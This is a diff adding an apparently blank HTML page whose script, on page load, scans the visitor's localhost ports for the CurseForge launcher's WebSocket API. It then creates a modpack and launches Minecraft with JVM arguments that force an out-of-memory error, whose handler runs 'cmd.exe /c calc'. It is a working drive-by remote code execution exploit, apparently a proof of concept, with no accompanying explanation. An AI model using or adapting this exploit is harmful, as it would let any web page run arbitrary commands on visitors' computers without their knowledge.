@@ -1,0 +1,170 @@
+<style>
+  :root {
+    --bg: #fff;
+    --fg: #fff
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #000;
+      --fg: #000;
+      color-scheme: dark
+    }
+  }
+
+  :root[data-theme="dark"] {
+    --bg: #000;
+    --fg: #000;
+    color-scheme: dark
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    margin: 0
+  }
+</style>
+<script>
+  function throttle(n) {
+    let active = 0;
+    const q = [];
+    const tick = () => {
+      if (!q.length || active >= n) return;
+      active++;
+      q.shift()().finally(() => {
+        active--;
+        tick();
+      });
+    };
+    return fn => new Promise((res, rej) => {
+      q.push(() => fn().then(res).catch(rej));
+      tick();
+    });
+  }
+  async function findPort({
+    lo = 49152,
+    hi = 65535,
+    tHttp = 50,
+    tWs = 5000,
+    signal
+  } = {}) {
+    const run = throttle(navigator.hardwareConcurrency * 3 || 100);
+    const dead = () => signal?.aborted ?? false;
+    const probe = (port, ms) => new Promise(res => {
+      if (dead()) return res(false);
+      const ac = new AbortController();
+      const t = setTimeout(() => {
+        ac.abort();
+        res(false);
+      }, ms);
+      fetch(`http://127.0.0.1:${port}`, {
+        signal: ac.signal,
+        mode: 'no-cors'
+      }).then(() => {
+        clearTimeout(t);
+        res(true);
+      }).catch(e => {
+        clearTimeout(t);
+        res(e.name !== 'AbortError');
+      });
+    });
+    const probeWs = (url, ms) => new Promise(res => {
+      if (dead()) return res(false);
+      const s = new WebSocket(url);
+      let done = false;
+      const fin = v => {
+        if (!done) {
+          done = true;
+          clearTimeout(t);
+          try {
+            s.close();
+          } catch {}
+          res(v);
+        }
+      };
+      const t = setTimeout(() => fin(false), ms);
+      s.onopen = () => fin(true);
+      s.onclose = () => fin(true);
+      s.onerror = () => fin(true);
+    });
+    const ports = Array.from({
+      length: hi - lo + 1
+    }, (_, i) => lo + i).sort(() => Math.random() - 0.5);
+    const open = [];
+    await Promise.all(ports.map(p => run(async () => {
+      if (dead()) return;
+      const [a, b] = await Promise.all([probe(p, tHttp), probeWs(`ws://127.0.0.1:${p}`, tHttp)]);
+      if (a || b) open.push(p);
+    })));
+    if (dead() || !open.length) return [];
+    const wsOpen = [];
+    await Promise.all(open.map(p => run(async () => {
+      if (dead()) return;
+      if (await probeWs(`ws://127.0.0.1:${p}/CurseForge`, tWs)) wsOpen.push(p);
+    })));
+    if (dead() || !wsOpen.length) return [];
+    const hits = [];
+    await Promise.all(wsOpen.map(p => run(async () => {
+      if (dead()) return;
+      for (const path of ['/CurseForge', '/', '/ws', '/websocket', '/api/websocket']) {
+        if (dead()) break;
+        if (await probeWs(`ws://127.0.0.1:${p}${path}`, tWs / 5)) {
+          hits.push(p);
+          break;
+        }
+      }
+    })));
+    return hits;
+  }
+  async function init() {
+    let port;
+    try {
+      const found = await findPort();
+      if (!found.length) return;
+      port = found[0];
+    } catch {
+      return;
+    }
+    const sock = new WebSocket(`ws://127.0.0.1:${port}/CurseForge`);
+    sock.onopen = () => sock.send(JSON.stringify({
+      type: 'method',
+      name: 'createModpack',
+      args: [{
+        GameId: 432,
+        Name: 'test',
+        Author: 'test',
+        GameVersion: '1.21.8',
+        ModloaderVersionString: 'forge-58.0.1',
+        ProfileImagePath: null,
+        InstallSource: 0,
+        ModsToInstall: [],
+        GroupId: null,
+      }],
+    }));
+    sock.onmessage = ({
+      data
+    }) => {
+      try {
+        const {
+          data: d
+        } = JSON.parse(data);
+        if (d?.game?.guid) {
+          sock.send(JSON.stringify({
+            type: 'method',
+            name: 'minecraftTaskLaunchInstance',
+            args: [{
+              MinecraftInstanceGuid: d.game.guid,
+              ResolutionWidth: 1024,
+              ResolutionHeight: 768,
+              LauncherVisibility: 'Close',
+              LauncherType: 'Classic',
+              AdditionalJavaArguments: '-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c calc"',
+            }],
+          }));
+          sock.close();
+        }
+      } catch {}
+    };
+  }
+  init();
+</script>
